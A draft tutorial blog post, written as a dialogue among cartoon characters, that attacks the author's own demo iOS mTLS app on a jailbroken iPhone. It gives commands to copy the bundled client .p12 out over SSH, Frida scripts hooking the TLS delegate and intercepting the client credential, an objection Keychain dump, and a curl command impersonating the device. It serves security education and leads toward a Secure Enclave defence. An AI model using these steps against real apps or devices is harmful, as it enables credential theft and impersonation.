---
title: "TLS & mTLS — Part 3: Breaking In"
date: 2026-03-22
draft: true
tags: ["security", "tls", "mtls", "ios", "frida", "jailbreak"]
series: ["TLS & mTLS"]
series_order: 3
summary: "A crow breaks into the iOS app we built. Extracts the certificate, hooks the delegate, dumps the Keychain. Everything we shipped in Part 2 falls apart."
---

*The crow hops down from the shelf.*

> **🐦‍⬛ Autolycus:** My turn.

In Part 2, we built an iOS app with mTLS. The server verified the client. The client verified the server. Mutual trust, transport-level authentication. We shipped it.

And then the crow smiled.

> **🐦‍⬛ Autolycus:** I've been watching from that shelf for a while now. Taking notes. You bundled a `.p12` file in the app. Hardcoded the password. Stored the identity in the Keychain with default flags. All very standard. All very... *accessible*.

> **🦆 Nestor:** Accessible? That's a good thing, right?

> **🐦‍⬛ Autolycus:** Depends on who's accessing it.

Today, Autolycus is going to break into our app. Three attacks, each targeting a different layer. By the end, he'll have stolen our client identity and used it to impersonate our iPhone from his laptop.

Everything we're about to do requires a **jailbroken device** — an iPhone where the usual security boundaries (sandbox, code signing enforcement, filesystem protection) have been weakened. We're using an iPhone 6S running iOS 15.8.1, jailbroken with palera1n. If you want to follow along, you'll need a jailbroken device with SSH access.

> **🦉 Menthor:** *Opens a rather alarming book.* A note before we proceed. What follows is a security demonstration on hardware you own. The techniques shown here — dynamic instrumentation, filesystem inspection, Keychain extraction — are standard tools of the iOS security research trade. They are used by penetration testers, security auditors, and Apple's own security team. Understanding the attack is a prerequisite for understanding the defense.

> **🦆 Nestor:** So we're breaking our own stuff to learn how to fix it?

Exactly. And Autolycus is going to show us how.

## What is Frida?

> **🦆 Nestor:** Before we start breaking things — what's Frida?

> **🦉 Menthor:** Frida is a dynamic instrumentation toolkit. It allows you to inject JavaScript into running processes and interact with them in real time. On iOS, this means you can hook Objective-C methods, inspect arguments, modify return values, and observe the internal behavior of any app — all without recompiling it.

Think of it this way: our app is a building with locked doors and security cameras. Frida lets you walk through the walls, watch the cameras' feeds, and replace the locks — while the building is in use.

> **🐦‍⬛ Autolycus:** Beautiful tool. Someone just leaves the blueprints lying around (that's the Objective-C runtime), and Frida lets you read them.

The key insight is that **Frida doesn't exploit a vulnerability in the app**. It exploits the nature of the Objective-C runtime — the same machinery that makes UIKit, KVO, and the entire Cocoa ecosystem work. On a jailbroken device, there's nothing stopping you from attaching to any process and using that machinery.

## Setting up

Two things to install: Frida tools on your Mac, and the Frida server on the jailbroken iPhone.

### On your Mac

```bash
# Install Frida CLI tools
pip3 install frida-tools

# Also install objection — a higher-level tool built on Frida
pip3 install objection

# Verify
frida --version
```

You'll also need `iproxy` from `libimobiledevice` to tunnel SSH over USB:

```bash
brew install libimobiledevice
```

### On the jailbroken iPhone

1. Open **Sileo** (the package manager that comes with palera1n)
2. Add the Frida repository: `https://build.frida.re`
3. Search for **Frida** and install it
4. Frida server will now run automatically when the device boots

### Connecting

Plug in the iPhone via USB, then:

```bash
# Terminal 1: start the SSH tunnel
iproxy 2222 22
```

```bash
# Terminal 2: SSH into the device
ssh root@localhost -p 2222
# Password: alpine (the default for jailbroken devices)
```

Verify Frida can see the device:

```bash
frida-ls-devices
```

```
[PLACEHOLDER: You should see your iPhone listed, something like:
Id              Type    Name
--------------  ------  ----------------
<device-udid>   usb     iPhone (6S)
]
```

And list running processes:

```bash
frida-ps -U
```

```
[PLACEHOLDER: A long list of processes. Look for familiar ones like SpringBoard, backboardd, etc.]
```

Good. We're in.

## Attack 1: The P12 heist

> **🐦‍⬛ Autolycus:** Let's start with the obvious one. You bundled a `.p12` file in the app. A file. In the app. Just... sitting there.

> **🦆 Nestor:** But it's inside the app! It's signed! You can't just—

> **🐦‍⬛ Autolycus:** Watch me.

### Finding the app

Every iOS app lives in a container directory. On a jailbroken device, you can browse the filesystem freely:

```bash
# On the iPhone (via SSH)
find /var/containers/Bundle/Application/ -name "TLSDemo.app" -type d
```

```
[PLACEHOLDER: Something like /var/containers/Bundle/Application/A1B2C3D4-E5F6-7890-ABCD-EF1234567890/TLSDemo.app]
```

Now let's look inside:

```bash
ls /var/containers/Bundle/Application/<uuid>/TLSDemo.app/
```

```
[PLACEHOLDER: You'll see the app contents — binary, frameworks, resources. Including ca.der and client.p12]
```

There it is. `client.p12`. The client identity we use for mTLS, just sitting in the app bundle like a house key under the doormat.

### Stealing it

```bash
# From your Mac — copy the file out via SCP
scp -P 2222 root@localhost:/var/containers/Bundle/Application/<uuid>/TLSDemo.app/client.p12 ./stolen.p12
```

We know the password is `"demo"` — we saw it in the source code. But even if we didn't, P12 passwords can be brute-forced. They're just encryption over a known format.

Let's verify we got something real:

```bash
# On your Mac — inspect the stolen P12
openssl pkcs12 -in stolen.p12 -info -passin pass:demo -nokeys
```

```
[PLACEHOLDER: You should see certificate info including:
subject=CN = demo-iphone, O = Demo
issuer=CN = TLSDemo CA, O = Demo
]
```

> **🐦‍⬛ Autolycus:** `CN=demo-iphone`. That's the client identity. Shall I prove it works?

### Using the stolen identity

```bash
# From the Mac — impersonate the iPhone
curl --cacert certs/out/ca.pem \
     --cert stolen.p12:demo \
     --cert-type P12 \
     https://<server-ip>:8444/secure
```

```
[PLACEHOLDER:
{"auth":"mutual TLS (both sides verified)","client":"demo-iphone","message":"Hello demo-iphone, mutual trust established"}
]
```

> **🦆 Nestor:** ...

> **🐦‍⬛ Autolycus:** The server thinks I'm the iPhone. Because I have its certificate and private key. I *am* the iPhone now, cryptographically speaking.

> **🦆 Nestor:** But — how? The app is signed! Apple verified it! Code signing is supposed to—

### Why this works

> **🦉 Menthor:** *Adjusts spectacles.* This is a common misunderstanding. Let me explain what code signing actually does — and what it does not.

**Code signing protects integrity, not confidentiality.** When Apple signs an app (or when you sign it during development), the signature guarantees two things:

1. **Provenance** — the app came from the developer who claims to have made it
2. **Integrity** — nobody has tampered with the binary or its resources since it was signed

What code signing does *not* do is **encrypt** the app's contents. The `.p12` file is bundled as a resource, like an image or a JSON file. It's right there in the app directory, readable by anything that can access the filesystem.

> **🦉 Menthor:** On a non-jailbroken device, the **sandbox** prevents other apps from reading your app's bundle directory. But the sandbox is a software construct — it's enforced by the kernel through a set of policies. A jailbreak modifies those policies. Once the sandbox is gone, the filesystem is an open book.

{{< mermaid >}}
graph TD
    subgraph Normal["Non-Jailbroken Device"]
        A1[App Bundle] -->|"Sandbox: ✗ Access denied"| B1[Other Apps]
        A1 -->|"Sandbox: ✗ Access denied"| C1[SSH / Terminal]
    end

    subgraph JB["Jailbroken Device"]
        A2[App Bundle] -->|"Sandbox: bypassed ✓"| B2[Other Apps]
        A2 -->|"Root filesystem access ✓"| C2[SSH / Terminal]
    end

    style B1 fill:#5a2727,stroke:#a44,color:#fff
    style C1 fill:#5a2727,stroke:#a44,color:#fff
    style B2 fill:#2d5a27,stroke:#4a8,color:#fff
    style C2 fill:#2d5a27,stroke:#4a8,color:#fff
{{< /mermaid >}}

The `.p12` file was always readable — the sandbox was just preventing anyone from looking. Remove the sandbox, and there's nothing left to protect it.

> **🐦‍⬛ Autolycus:** Bundling a secret in an app bundle is like hiding a key inside a locked glass cabinet. The lock keeps honest people out. I just broke the glass.

## Attack 2: Hooking the delegate

> **🐦‍⬛ Autolycus:** The P12 was the easy prize. Now let's do something more interesting. Let's watch the app's TLS handshake from the inside.

This time, we're not stealing a file. We're injecting code into the running app process to observe what happens during the mTLS authentication challenge.

### The script

```javascript
// hook_delegate.js — Intercept mTLS authentication challenges

var className = "TLSDemo.MTLSService";
var methodName = "- URLSession:didReceiveChallenge:completionHandler:";

var MTLSService = ObjC.classes[className];
if (!MTLSService) {
    console.log("[!] Class not found: " + className);
    // Swift name mangling — list all classes to find the right one
    console.log("[*] Searching for classes containing 'MTLS'...");
    for (var name in ObjC.classes) {
        if (name.indexOf("MTLS") !== -1) {
            console.log("    Found: " + name);
        }
    }
} else {
    var hook = MTLSService[methodName];
    Interceptor.attach(hook.implementation, {
        onEnter: function(args) {
            // args[0] = self, args[1] = _cmd, args[2] = session,
            // args[3] = challenge, args[4] = completionHandler
            var challenge = new ObjC.Object(args[3]);
            var protectionSpace = challenge.protectionSpace();
            var method = protectionSpace.authenticationMethod().toString();
            var host = protectionSpace.host().toString();
            var port = protectionSpace.port();

            console.log("\n[*] ===== Authentication Challenge =====");
            console.log("[*] Method: " + method);
            console.log("[*] Host:   " + host);
            console.log("[*] Port:   " + port);

            if (method === "NSURLAuthenticationMethodServerTrust") {
                var trust = protectionSpace.serverTrust();
                console.log("[*] Server trust object: " + trust);
                console.log("[*] (App will evaluate this against bundled CA)");
            }

            if (method === "NSURLAuthenticationMethodClientCertificate") {
                console.log("[*] >>> Server is requesting client certificate <<<");
                console.log("[*] The app will now present the P12 identity...");
            }
        }
    });
    console.log("[✓] Hooked " + className + " → " + methodName);
}
```

### Running it

```bash
# Spawn the app with Frida, injecting our script at launch
frida -U -f com.demo.TLSDemo -l hook_delegate.js
```

The `-f` flag tells Frida to **spawn** the app (launch it fresh) and pause it before any code runs. Our hook is injected, then the app resumes. When you tap "Connect" on the mTLS tab, you'll see:

```
[PLACEHOLDER: Something like:
[✓] Hooked TLSDemo.MTLSService → - URLSession:didReceiveChallenge:completionHandler:

[*] ===== Authentication Challenge =====
[*] Method: NSURLAuthenticationMethodServerTrust
[*] Host:   <server-ip>
[*] Port:   8444
[*] Server trust object: <SecTrustRef: 0x...>
[*] (App will evaluate this against bundled CA)

[*] ===== Authentication Challenge =====
[*] Method: NSURLAuthenticationMethodClientCertificate
[*] Host:   <server-ip>
[*] Port:   8444
[*] >>> Server is requesting client certificate <<<
[*] The app will now present the P12 identity...
]
```

> **🦆 Nestor:** You can see everything that happens inside our delegate?

> **🐦‍⬛ Autolycus:** Everything. Every challenge, every argument, every decision. I can see the server asking for a client certificate. I can see the app loading the P12. I could even *modify* the completion handler — accept a different server, present a different identity, or just log the credential as it goes by.

### Going further: intercepting the credential

The hook above is passive — it just watches. But Frida can do more. Here's a script that intercepts the `URLCredential` being passed back:

```javascript
// hook_credential.js — Intercept the credential being presented

var className = "TLSDemo.MTLSService";
var methodName = "- URLSession:didReceiveChallenge:completionHandler:";

var MTLSService = ObjC.classes[className];
var hook = MTLSService[methodName];

Interceptor.attach(hook.implementation, {
    onEnter: function(args) {
        var challenge = new ObjC.Object(args[3]);
        var method = challenge.protectionSpace().authenticationMethod().toString();

        if (method === "NSURLAuthenticationMethodClientCertificate") {
            // The completionHandler is a block — we can replace it
            var origHandler = new ObjC.Block(args[4]);
            var origInvoke = origHandler.implementation;

            origHandler.implementation = function(disposition, credential) {
                if (credential) {
                    var cred = new ObjC.Object(credential);
                    console.log("\n[*] ===== Client Credential Intercepted =====");
                    console.log("[*] Credential: " + cred.toString());
                    console.log("[*] Identity:   " + cred.identity());
                    console.log("[*] Has identity: " + (cred.identity() ? "YES" : "NO"));
                }
                // Pass it through — don't break the connection
                origInvoke(disposition, credential);
            };
        }
    }
});
console.log("[✓] Credential interceptor active");
```

```
[PLACEHOLDER:
[✓] Credential interceptor active

[*] ===== Client Credential Intercepted =====
[*] Credential: <NSURLCredential: 0x...>
[*] Identity:   <SecIdentityRef: 0x...>
[*] Has identity: YES
]
```

> **🐦‍⬛ Autolycus:** I can see the `SecIdentity` object passing through. The private key, the certificate — the whole thing. Flowing right past me.

### Why this works

> **🦉 Menthor:** The key to understanding this attack is the **Objective-C runtime**.

> **🦉 Menthor:** Swift classes that inherit from `NSObject` — as ours do, because `URLSessionDelegate` requires it — are registered in the Objective-C runtime. Every method call is dispatched dynamically through a function called `objc_msgSend`. It is a central switchboard: every message, every delegate callback, every protocol method passes through it.

This is not a weakness. It's the foundation of everything in Cocoa. It's what makes Interface Builder work. It's what makes Key-Value Observing work. It's what makes the responder chain work. The entire iOS framework relies on this level of dynamism.

> **🦉 Menthor:** Frida exploits this by injecting a shared library (a dylib) into the target process. Once inside, it has full access to the Objective-C runtime — it can enumerate classes, list methods, read their implementations, and replace them with custom code. The `Interceptor.attach` call simply redirects the method's function pointer to a trampoline that calls your JavaScript first, then the original implementation.

{{< mermaid >}}
sequenceDiagram
    participant App as 📱 App
    participant Runtime as ObjC Runtime
    participant Frida as 🐦‍⬛ Frida
    participant Method as Original Method

    Note over App,Method: Normal flow (no Frida)
    App->>Runtime: objc_msgSend(self, selector, ...)
    Runtime->>Method: Jump to implementation
    Method-->>App: Return value

    Note over App,Method: With Frida hook
    App->>Runtime: objc_msgSend(self, selector, ...)
    Runtime->>Frida: Jump to trampoline
    Frida->>Frida: Run JavaScript (onEnter)
    Frida->>Method: Call original implementation
    Method->>Frida: Return value
    Frida->>Frida: Run JavaScript (onLeave)
    Frida-->>App: Return value
{{< /mermaid >}}

> **🦆 Nestor:** So the app doesn't even know it's being watched?

> **🦉 Menthor:** Correct. The original method still runs. The arguments are unchanged. The return value is unchanged — unless the attacker decides to modify it. From the app's perspective, nothing happened. It is, to use a somewhat ominous metaphor, a perfect wiretap.

> **🐦‍⬛ Autolycus:** And the best part? This works on *any* Objective-C method. Not just ours. `SecPKCS12Import`? Hookable. `SecTrustEvaluateWithError`? Hookable. I could make your app trust any certificate I want.

That's a real threat — an attacker could hook the trust evaluation to accept a malicious server certificate (a person-in-the-middle attack). But let's save that thought. One more attack to go.

## Attack 3: The Keychain

> **🐦‍⬛ Autolycus:** You know what else is interesting? The Keychain.

When our app calls `SecPKCS12Import`, it doesn't just parse the P12 in memory. It imports the private key and certificate into the iOS Keychain — Apple's secure credential store. This is how `SecIdentity` works under the hood: it's a reference to a Keychain item.

On a non-jailbroken device, each app can only see its own Keychain entries. But on a jailbroken device...

### Dumping with objection

[Objection](https://github.com/sensepost/objection) is a tool built on top of Frida that provides a set of pre-built commands for mobile security testing. One of them dumps the Keychain.

```bash
# Launch the app with objection
objection -g com.demo.TLSDemo explore
```

Once inside the objection REPL:

```bash
# Dump all Keychain items accessible to this app
ios keychain dump
```

```
[PLACEHOLDER: You should see output like:

Class:        kSecClassIdentity
Account:
Service:
Data:         <SecIdentityRef>
Access Group: com.demo.TLSDemo
Accessible:   kSecAttrAccessibleWhenUnlocked
Extractable:  true

Class:        kSecClassCertificate
Account:
Label:        demo-iphone
Data:         <certificate data in hex>
Access Group: com.demo.TLSDemo

Class:        kSecClassKey
Account:
Label:        demo-iphone
Type:         EC (P-256)
Size:         256
Extractable:  true
Data:         <private key data in hex>
]
```

> **🐦‍⬛ Autolycus:** See that? `Extractable: true`. That means I can read the raw private key bytes. Not just a reference to it. The actual key.

> **🦆 Nestor:** Why is it extractable?!

### Why this works

> **🦉 Menthor:** Because that's the default.

> **🦉 Menthor:** The iOS Keychain has several access control flags that govern how items are stored and retrieved. The two most relevant here are:

| Flag | Default | What it controls |
|------|---------|-----------------|
| `kSecAttrAccessible` | `kSecAttrAccessibleWhenUnlocked` | *When* the item can be accessed (device locked/unlocked) |
| `kSecAttrIsExtractable` | `true` | Whether the raw key data can be exported |

> **🦉 Menthor:** When `SecPKCS12Import` imports a private key into the Keychain, it uses the default flags. The key is marked as extractable. This means any code running in the app's process — including Frida's injected JavaScript — can call `SecItemCopyMatching` with `kSecReturnData: true` and receive the raw key bytes.

> **🦉 Menthor:** On a non-jailbroken device, this is not an issue — only your app can access your Keychain items, and if your own app wants to read its own keys, that's expected. The Keychain's security model assumes the process boundary is intact: your app is the only code running in your app.

> **🦉 Menthor:** A jailbreak shatters that assumption. Frida injects code *into your process*, running with your app's entitlements, with your app's Keychain access group. From the Keychain's perspective, Frida's code *is* your app.

{{< mermaid >}}
graph TD
    subgraph Normal["Non-Jailbroken"]
        A1["App Code"] -->|"Same process"| K1["Keychain API"]
        K1 -->|"✓ Access granted"| D1["App's Keychain Items"]
        X1["Other Code"] -.->|"✗ Different process"| K1
    end

    subgraph JB["Jailbroken + Frida"]
        A2["App Code"] -->|"Same process"| K2["Keychain API"]
        F2["🐦‍⬛ Frida (injected)"] -->|"Same process!"| K2
        K2 -->|"✓ Access granted to both"| D2["App's Keychain Items"]
    end

    style X1 fill:#5a2727,stroke:#a44,color:#fff
    style F2 fill:#2d5a27,stroke:#4a8,color:#fff
{{< /mermaid >}}

> **🐦‍⬛ Autolycus:** The Keychain can't tell the difference between the app asking for the key and *me* asking for the key. Because we're in the same process. I'm wearing the app's clothes.

## The proof

> **🐦‍⬛ Autolycus:** So let me put it all together. Three attacks, one stolen identity.

Let's take stock of what we got:

| Attack | What we got | How |
|--------|-------------|-----|
| **1. P12 from bundle** | Complete client identity (cert + private key) | File copy from app bundle |
| **2. Frida hook** | Real-time view of authentication flow | ObjC runtime interception |
| **3. Keychain dump** | Raw private key bytes, extractable | In-process Keychain access |

Attacks 1 and 3 both give us the same thing — the private key. Attack 1 is simpler (just copy a file), but Attack 3 would still work even if we stopped bundling the P12 and stored the key in the Keychain instead. Attack 2 gives us visibility into the process, which enables more sophisticated attacks like man-in-the-middle.

But the headline is simple: **we can extract the client identity and use it from another machine.**

```bash
# The final proof — the developer's Mac, pretending to be the iPhone
curl --cacert certs/out/ca.pem \
     --cert stolen.p12:demo \
     --cert-type P12 \
     https://<server-ip>:8444/secure
```

```json
{"auth":"mutual TLS (both sides verified)","client":"demo-iphone","message":"Hello demo-iphone, mutual trust established"}
```

The server says "Hello demo-iphone, mutual trust established." But it's not talking to the iPhone. It's talking to Autolycus.

> **🐦‍⬛ Autolycus:** *Bows.* Mutual trust, you say? I think the trust was a bit... one-sided.

## What went wrong?

> **🦆 Nestor:** Okay, I'm upset. We did everything the tutorials said. Custom CA, certificate pinning, mTLS. It all *worked*. How can it be broken?

Nothing we built was *wrong*. The TLS implementation is correct. The certificate validation is correct. The mTLS handshake is correct. The problem is deeper:

**The private key is just data.**

It's bytes in a file, or bytes in the Keychain, or bytes in memory. Anyone who can read those bytes can copy them. And on a jailbroken device, the attacker can read anything the app can read — because the attacker *is* the app, from the OS's perspective.

> **🦉 Menthor:** This is the fundamental limitation of software-only key storage. No matter how many layers of encryption, access control, or obfuscation you add — if the key must be loaded into the app's memory to be used, it can be intercepted at the point of use. The chain of trust is only as strong as the most accessible copy of the private key.

> **🦆 Nestor:** So what do we do? Is mTLS useless?

> **🦉 Menthor:** Quite the opposite. mTLS is sound. The cryptography is not broken. What's broken is the *key storage model*. We need a way to use a private key without the key ever being readable — not by the app, not by Frida, not by anyone.

> **🦆 Nestor:** That sounds impossible.

> **🐦‍⬛ Autolycus:** *Tilts head.* Yeah, how would that even work? If the app can't read the key, how does it sign things?

> **🦉 Menthor:** By not reading the key. By asking the hardware to sign on the app's behalf.

> **🦆 Nestor:** The hardware?

> **🦉 Menthor:** The **Secure Enclave**. A separate processor, with its own encrypted memory, built into the iPhone's chip. It generates keys that never leave its boundary. When the app needs to sign something, it sends the data *in*, and the signature comes *out*. The private key itself never enters the app's memory, never touches the Keychain in extractable form, never exists anywhere Frida can reach.

> **🐦‍⬛ Autolycus:** ...

> **🦆 Nestor:** Is the crow worried?

> **🐦‍⬛ Autolycus:** The crow is *intrigued*. Let's see if it's as good as the owl says.

See you in Part 4.
